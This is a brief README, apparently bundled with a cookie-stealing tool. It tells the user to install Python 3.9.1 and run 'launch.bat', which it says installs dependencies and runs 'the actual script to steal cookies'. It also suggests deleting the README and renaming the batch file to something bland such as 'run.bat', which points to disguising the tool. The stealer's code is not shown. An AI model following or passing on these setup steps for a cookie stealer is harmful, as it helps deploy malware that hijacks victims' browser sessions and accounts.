1. install this: https://www.python.org/ftp/python/3.9.1/python-3.9.1-amd64.exe
2. Once you're done downloading the python install, run "launch.bat". It will install any updates, and dependencies if needed.
   ("launch.bat" will also run the actual script to steal cookies, so be careful)

(you may delete this file, and rename "launch.bat" to anything. (e.g "run.bat"))
